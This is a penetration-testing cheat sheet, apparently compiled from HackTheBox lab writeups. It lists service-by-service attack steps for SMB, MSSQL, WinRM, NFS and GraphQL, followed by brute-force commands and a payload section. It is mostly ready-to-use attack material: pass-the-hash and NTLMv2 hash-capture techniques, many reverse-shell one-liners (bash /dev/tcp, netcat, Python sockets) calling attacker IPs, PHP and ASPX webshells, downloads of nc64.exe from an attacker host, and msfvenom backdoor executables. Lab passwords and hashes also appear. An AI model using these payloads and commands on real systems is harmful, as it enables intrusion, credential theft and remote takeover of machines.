uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
...[snip]...
```



**Check for Certificate**

If we had port 3269 open with SSL/LDAP service

ex - 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)

Check for certificate authority that issued the certificate, if it is AD then check for `Active Directory Certificate Services (AD CS)  Misconfiguration`.

```
openssl s_client -showcerts -connect 10.10.11.202:3269  | openssl x509 -noout -text

```
A quick way to check if ADCS is used is using crackmapexec
```
crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
```
- If it used and then check if there are any templates in this ADCS that are insecurely configured and achieve PE.


#### 139, 445 SMB, SAMBA

https://0xdf.gitlab.io/cheatsheets/smb-enum#checklist

```
nmap 192.213.18.3 -sV --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 445
```
**Anonymous Access**
```
smbmap -H 192.120.159.3 

smbclient -L //192.221.150.3

rpcclient -U "" -N 192.230.148.3
>netshareenum
>netshareenumall

crackmapexec smb  10.10.11.202 -u 'anonymous' -p '' --shares
```
**Authenticated Access**
```
smbclient //192.180.12.3/shawn -U admin

smbclient '//10.10.10.175/RICOH Aficio SP 8300DN PCL 6' -U fsmith

crackmapexec smb  10.10.11.202 -u 'username' -p 'password' --shares
```
**Enumerate shares recursively**
```
smbmap -H 192.120.159.3 -R --depth 5
smbclient --no-pass -c 'recurse;ls' //192.180.12.3/shawn
smbmap  -H 10.5.26.125 -u administrator -p smbserver_771 -d . -R --depth 5
smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'

```
**Brute Force**
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.241.81.3 smb
```

**Get/Put files from Share**
```
# Get single file
smb: \> get filename

# Get All files recursively
smb: \> recurse ON
smb: \> mask ""
smb: \> prompt OFF
smb: \> mget *

# Put file
smb: \> put test.php
```
**Remote Command Execution**
```
smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'
crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"
```
**Paas The Hash**
```
crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d
```
**Remote Shell : PSExec**
```
# PsExec

python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100

impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100


use exploit/windows/smb/psexec
```
**Exploit Write Access**

Write Access -> Upload File -> Capture NTLMv2

https://0xdf.gitlab.io/2023/05/06/htb-flight.html#capture-netntlmv2

In addition to the read access, S.Moon has write access to Shared:
```
oxdf@hacky$ crackmapexec smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ,WRITE      
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ  
```

With write access we can upload files that may act as a legitimate visiting user trying to authenticate out Attacker host, we can do that using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

I’ll use ntml_theft.py to create all the files:

```
oxdf@hacky$ python ntlm_theft.py -g all -s 10.10.14.6 -f 0xdf
Created: 0xdf/0xdf.scf (BROWSE TO FOLDER)
Created: 0xdf/0xdf-(url).url (BROWSE TO FOLDER)
Created: 0xdf/0xdf-(icon).url (BROWSE TO FOLDER)
Created: 0xdf/0xdf.lnk (BROWSE TO FOLDER)
Created: 0xdf/0xdf.rtf (OPEN)
Created: 0xdf/0xdf-(stylesheet).xml (OPEN)
Created: 0xdf/0xdf-(fulldocx).xml (OPEN)
Created: 0xdf/0xdf.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: 0xdf/0xdf-(includepicture).docx (OPEN)
Created: 0xdf/0xdf-(remotetemplate).docx (OPEN)
Created: 0xdf/0xdf-(frameset).docx (OPEN)
Created: 0xdf/0xdf-(externalcell).xlsx (OPEN)
Created: 0xdf/0xdf.wax (OPEN)
Created: 0xdf/0xdf.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: 0xdf/0xdf.asx (OPEN)
Created: 0xdf/0xdf.jnlp (OPEN)
Created: 0xdf/0xdf.application (DOWNLOAD AND OPEN)
Created: 0xdf/0xdf.pdf (OPEN AND ALLOW)
Created: 0xdf/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: 0xdf/Autorun.inf (BROWSE TO FOLDER)
Created: 0xdf/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

Connecting from the directory with the ntlm_theft output, I’ll upload all of them to the share:
```
oxdf@hacky$ smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> prompt false
smb: \> mput *
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(frameset).docx
putting file 0xdf.jnlp as \0xdf.jnlp (0.7 kb/s) (average 0.7 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.asx
putting file 0xdf.application as \0xdf.application (6.0 kb/s) (average 3.3 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.htm
putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 1.7 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.rtf
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(icon).url
putting file 0xdf-(stylesheet).xml as \0xdf-(stylesheet).xml (0.6 kb/s) (average 1.5 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.wax
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.scf
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.m3u
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(url).url
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(remotetemplate).docx
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.pdf
putting file 0xdf-(fulldocx).xml as \0xdf-(fulldocx).xml (156.1 kb/s) (average 40.2 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(externalcell).xlsx
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.lnk
smb: \> ls
  .                                   D        0  Fri Oct 28 21:22:19 2022
  ..                                  D        0  Fri Oct 28 21:22:19 2022
  0xdf-(fulldocx).xml                 A    72584  Fri Oct 28 21:22:19 2022
  0xdf-(stylesheet).xml               A      162  Fri Oct 28 21:22:18 2022
  0xdf.application                    A     1649  Fri Oct 28 21:22:17 2022
  0xdf.jnlp                           A      191  Fri Oct 28 21:22:16 2022
  desktop.ini                         A       46  Fri Oct 28 21:22:17 2022

                7706623 blocks of size 4096. 3748999 blocks available
```

Interestingly, a bunch are blocked. But a few do make it.

With responder still running, after a minute or two there’s a hit from C.Bum:

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:01f43be12046b7a8:8ADA90E6C9FD9597A77028B01332FA06:010100000000000080C2A3C1D8EAD801955E5614E82C877C000000000200080030004A004300330001001E00570049004E002D005200530054005200310047004200510038003600350004003400570049004E002D00520053005400520031004700420051003800360035002E0030004A00430033002E004C004F00430041004C000300140030004A00430033002E004C004F00430041004C000500140030004A00430033002E004C004F00430041004C000700080080C2A3C1D8EAD80106000400020000000800300030000000000000000000000000300000B1315E28BC96528147F3929B329DC4FE9D27ADEB96DF3BCF9F6C892CCB4443D80A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

Now we can crack it , hashcat with rockyou will quickly return the password “Tikkycoll_431012284”:
```
hashcat c.bum-net-ntlmv2 /usr/share/wordlists/rockyou.tx
```
```
oxdf@hacky$ crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284'
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284
```

**KnownExploits**
- EternalBlue
    - Exploiting `EternalBlue` vulnerabibility in SMBv1
        - `use auxiliary/scanner/smb/smb_ms17_010`

#### 1433 MS-SQL

**Connecting / Loginto the DB**

Log into DB using credentials, Using Impacket module
```
mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb

impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202 
```

Connect to MSSQL when you already have a winrm shell
```
#  I could upload Chisel and tunnel to port 1433 (MSSQL), but sqlcmd happens to be installed and available on StreamIO:

PS C:\> where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE

# -S localhost - host to connect to
# -U db_admin - the user to connect with
# -P B1@hx31234567890 - password for the user
# -d streamio_backup - database to use
# -Q [query] - query to run and then exit

PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"

# looking into users table

PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"

https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#streamio_backup-db
```
**enabling xp_cmdshell**

Try to run or enable xp_cmdshell if disabled
```
SQL (PublicUser  guest@master)> xp_cmdshell whoami

SQL (PublicUser  guest@master)> enable_xp_cmdshell
```

**Get NTLMv2 Hash Using xp_dirtree stacked qeuries**

Try to Capture the NTLMv2 hash of the account with which the mssql service is running using xp_dirtree

Example - In this example we are connected to DB
```
# start responder on attacker macchine

sudo python3 Responder.py -I tun0
sudo responder -I tun1

# Now you’ll tell MSSQL to read a file on a share on my host using xp_dirtree

SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\10.10.16.3\share', 1, 1

# It returns nothing, but at Responder there’s a “hash” of the account running the MSSQL service., you’ll use hashcat to crack this

https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#database-access
```
Example - In this example we have an sql injection exploitable by web app
```
# Nothing will come back on the web page, but there is a connection at responder:

sudo responder -I tun0

abcd'; use master; exec xp_dirtree '\\10.10.14.6\share';-- -

https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#ntlm-hash---dead-end
```
**Enumerate DB**

Enumerate databases on server
```
SQL (PublicUser  guest@master)> select name from master..sysdatabases;
name     
------   
master   
tempdb   
model    
msdb  
```

***************************************************************************************************


#### 2049 NFS

1.  check If we get 111 and 2049 listed , means shares are enabled and we can mount them

```
rpcinfo -p <ip>
```

2. check for mounts, basically it will provide folders/directory that can be accessed by us (provided they are accessible by everyone)

```
showmount -e <ip>
```

3. Mount the directory on your system (in order to gain access into the directory, you must be root)

```
su root

mkdir /mnt/nfs

mount -o nolock -t nfs $ip:/share /mnt/nfs

Example:
mount -t nfs 10.10.215.199:/users /mnt/nfs/ 
```

Note: Try to access the NFS mount at the location you created . If you're unable to access this location, then the target has correctly enabled [root_squashing](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-security_guide-securing_nfs-do_not_use_the_no_root_squash_option) so that we can't read the contents.
#### 3389 RDP

- Connecting RDP
    - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`
    - `rdesktop -u 'bitbucket' -p 'littleredbucket' 10.10.125.136:3389`

#### 3306 MySQL

1. Connect with database
```
$ mysql -h {hostname} -u username -p {databasename}
Password: {your password}

svc@busqueda:/var/www/app/.git$ mysql -h 172.19.0.3 -u gitea -p yuiu1hoiu4i5ho1uh -D gitea
Enter password: yuiu1hoiu4i5ho1uh

```
2. Enumerate databases
```
# check for db available
mysql> show databases;

# check if user table exist
mysql> select * from user;

# check for user password 
mysql> select name,email,passwd from user;


```

#### 5985,5986 WinRM

**WinRM Arbitiary command execution**
```
crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"
```

**Winrm shell**
```
# Note - for 5986 ie SSL add -S flag

evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211
```
```
evil-winrm -u lvetrova -H f220d3988deb3f516c73f40ee16c431d -i 10.5.27.211
```
```
use windows/winrm/winrm_script_exec` > `set RHOSTS 10.5.27.211` > `set RPORT 5985` > `set USERNAME administrator` > `set PASSWORD tinkerbell` > `set FORCE_VBS true` > `exploit
```

**Winrm Shell using Pfx file / Public Cert + Private Key**

A .pfx file typically represents the PKCS#12 format, containing both a public and private key for a user. if you can get access to this file, you’ll be able to get a shell over WinRM or other.

[This post](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) shows the openssl commands to extract the private key and certificate (public key) from a .pfx file.
```
# Run the following command to extract the private key:
openssl pkcs12 -in [yourfile.pfx] -nocerts -out [drlive.key]
```
```
# Run the following command to extract the certificate:
openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [drlive.crt]
```
```
# Now we can use this public key Certificate and the private Key with Winrm to get shell

# -S - Enable SSL, because I’m connecting to 5986;
# -c legacyy_dev_auth.crt - provide the public key certificate
# -k legacyy_dev_auth.key - provide the private key
# -i timelapse.htb - host to connect to

evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```
*****************************************************************************************

If you are prompted for a password then crack that using pfx2john
```
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Mac verify error: invalid password?

# We can use `pfx2john.py` to generate a hash for this which John can crack

pfx2john legacyy_dev_auth.pfx > pfx.hash

# Crack hash

john  --wordlist=~/Downloads/rockyou.txt  pfx.hash 

# Get private key - Enter the password and a passphrase which you can remember

└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

# Dump the Public Certificate


└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:

# Now both files exist

└─$ ls legacyy_dev_auth.*
legacyy_dev_auth.crt  legacyy_dev_auth.key  legacyy_dev_auth.pfx

Now we can use this public key Certificate and the private Key with Winrm to get shell
```
```
# -S - Enable SSL, because I’m connecting to 5986;
# -c legacyy_dev_auth.crt - provide the public key certificate
# -k legacyy_dev_auth.key - provide the private key
# -i timelapse.htb - host to connect to

evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```



#### GraphQL

https://0xdf.gitlab.io/2019/06/08/htb-help.html#web---tcp-3000

Get the fields from the schema:
```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq  -c .
```
Get the types of User, String, etc
```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types { name } } }" }' | jq -c .
```
Get the fields asscoaited with the User type
```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq .
```
Try to get the values
```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .
```
```
root@kali# curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

[More](https://graphql.org/learn/introspection/)



### [BRUTE FORCING](#)

#### **Hydra**

- NTLM
    - `hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'` (/ = path to the login page, A=NTLM = NTLM authentication type, F=401 = failure code)

- HTTP
    - `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.5.21.117 http-get /webdav/`
    - `hydra -l admin -P rockyou.txt 127.0.0.1 -s 8080  http-get /login`

```
# https-post-form plugin, which takes a string formatted as [page to post to]:[post body]:F=[string that indicates failed login]

hydra -l yoshihide -P passwords streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"

https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#check-passwords
```


- FTP
    - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp`

- SSH
    - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.72.183.3 ssh`

- SMB
    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.241.81.3 smb`

- RDP
    - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.5.31.78 rdp -s 3333`

#### Nmap

- http-brute
    - `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/` / `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/webdav/` / `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/`
- ftp-brute
    - `nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21`
- ssh-brute
    - `nmap 192.72.183.3 -p 22 --script ssh-brute --script-args userdb=/root/user`

#### Crackmapexec

- WinRM
    - `crackmapexec winrm 10.5.16.53 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` 
    - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`

- Pass the hash using crackmapexec
    - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d`
    - `crackmapexec smb $IP -u users.txt -p pass.txt`

- Remote code Execution using crackmapexec
    - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"`


#### wpscan 

- `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`

#### Metasploit
- 
    - `use auxiliary/scanner/ssh/ssh_login`
    - `use auxiliary/scanner/smb/smb_login`
    - `use auxiliary/scanner/smb/http_login`
    - `use auxiliary/scanner/smb/ftp_login`


### [PAYLODS & EXPLOITS](#)

#### ExploitDB - SearchSploit

Search for exploit with vulnerable thing
```
┌──(kali㉿kali)-[~/git/dumped/.git]
└─$ searchsploit HelpDeskZ  
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                   | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                            | php/webapps/41200.py
Helpdeskz v2.0.2 - Stored XSS                                                                                                                             | php/webapps/52068.txt
```
Copy the exploit to your current dir
```
# -m is the exploit id
sudo searchsploit -m 40300 .
```
#### Compille payloads

##### C
https://0xdf.gitlab.io/2019/06/08/htb-help.html#exploit-1
```
gcc -o exploit 44298.c
```
```
$ wget http://10.10.14.6/44298.c     
$ gcc -o exploit 44298.c
$ ls
032fb809dc14050bf43b3205696e6f84.php
1e968ea410e36379b8419fe2b1f077d7.php
24dcf2e24d81d5f6f6144a0ca94d6005.php
3ce4ec1d1c393f793ee27903deb1ea8f.php
40300.py
44298.c
51e29978ae0d7a6d604db422b3267b59.php
bc0fe48b8f4db25958d9d0c27de728c6.txt
d1e7c0738cf0d890eef24f020140d9df.xml
exploit
f2b9ee175591f91147ed986e86a2768f.php5
fa4a406150dc702f4099d3b67923c1f2.txt
index.php
$ ./exploit
id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
```

#### REVERSE SHELLs

[pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[revshells.com](https://www.revshells.com/)

https://github.com/tennc/webshell/tree/master/fuzzdb-webshell


##### Payload Creation
```
- Find Alternative for whitespace

- Base64 encode payload
```
**Find Alternative for whitespace**

We can use braces {} with ',' in case the input is going into linux terminal, because it will work as space
[Check this](https://youtu.be/okTl6kWrncg?t=816)

We can use $IFS, $IFS is a special variable that defines the internal field separator used when splitting a string into individual words
[Check this](https://youtu.be/okTl6kWrncg?t=825)

**Base64 encode payload**

##### nc

```
# Windows Target
    - Target - `nc.exe 10.0.0.1 1234 -e cmd.exe`
    - Listen - `nc -nlvp 1234`

# Linux Target
    - Target - `nc 10.0.0.1 1234 -e /bin/bash`
    - Listener - `nc -nlvp 1234`
```

##### bash

[Bash Reverse Shell BreakDown](https://www.youtube.com/watch?v=OjkVep2EIlw)

```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

```
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```

```
bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"
```

```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"
```

```
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

```
/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

```
cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f'

'http://10.10.10.121/support/uploads/tickets/30487f2924a0ae640ba2c0a54c9136f1.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f'
```

##### PHP

**PHP Reverse Shell**

https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php

// change the host address and/or port number as necessary

**php BASH reverse shell**

[Example Use](https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html#shell)
```
<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"'); ?>
```

**standard webshell - shell.php**
```
<?php system($_REQUEST['cmd']); ?>
```
Example: Linux
```
# first upload the payload
# The webshell provides then execution

oxdf@hacky$ curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

#  start nc listening on 443 on my host
oxdf@hacky$ curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"'

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.194 55140

```
Example: Windows
```
smb: \school.flight.htb\styles\> put shell.php

oxdf@hacky$ curl school.flight.htb/styles/shell.php?cmd=whoami
flight\svc_apache

# To go from webshell to shell, I’ll upload nc64.exe to the same folder:

smb: \school.flight.htb\styles\> put /opt/netcat/nc64.exe nc64.exe

# Now I’ll invoke it over the webshell:

oxdf@hacky$ curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
```

```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    
Example vector - Wordpress Theme Editor
```

```
https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#remote-execution

# In this command was getting injected into eval directly so <php> tag not required

system("powershell -c wget 10.10.14.6/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.14.6 443");

```

##### aspx / ASP.NET

WebShell - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx


[EXAMPLE](https://0xdf.gitlab.io/2023/05/06/htb-flight.html#webshell-1)

Create a silly ASPX file that writes a string, poc.aspx:

```
<% Response.Write("0xdf was here") %>
```
upload that over SMB, and then copy it into the development directory:
```
C:\inetpub\development>copy \xampp\htdocs\poc.aspx .
        1 file(s) copied.
```
On visiting the page, it works:

![alt text](https://0xdf.gitlab.io/img/image-20221025150019862.webp)

To run commands, I’ll download the aspx webshell mentioned above from GitHub, upload it over SMB, and copy it into place:
```
C:\inetpub\development>copy \xampp\htdocs\cmd.aspx .
        1 file(s) copied
```
Loading the page shows a form

![alt text](https://0xdf.gitlab.io/img/image-20221025150250821.webp)

Clicking “Run” shows the output below:

![alt text](https://0xdf.gitlab.io/img/image-20221025150313619.webp)

Upload a nc64.exe to target and get a shell

![alt text](https://0xdf.gitlab.io/img/image-20221025150750628.webp)

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.230 50163
```

##### Python
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<HTBoxVPNIP>",YOURPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools 


##### Groovy
    - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
    
    - Some Example vectors
        - Jenkins Script Console

##### Msfvenom (staged Non-meterpreter binaries)
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
-exe
    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe `

##### Msfvenom (staged meterpreter binaries)
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
- asp
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f asp > shell.asp`

- exe
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe`

- elf
    - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > mybinary`

- exe
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe`

- x86/shikata_ga_nai 
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe > payload.exe`

**Listener**

- Metasploit 
    - Mulit/handler
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `run`



### [DISCOVER HIDDEN PORTS]


### Might Require

Epoch Time Converter 

https://www.epochconverter.com/?prefs

[More](https://medium.com/@onurinalkac/hack-the-box-help-writeup-ae1a75c66475)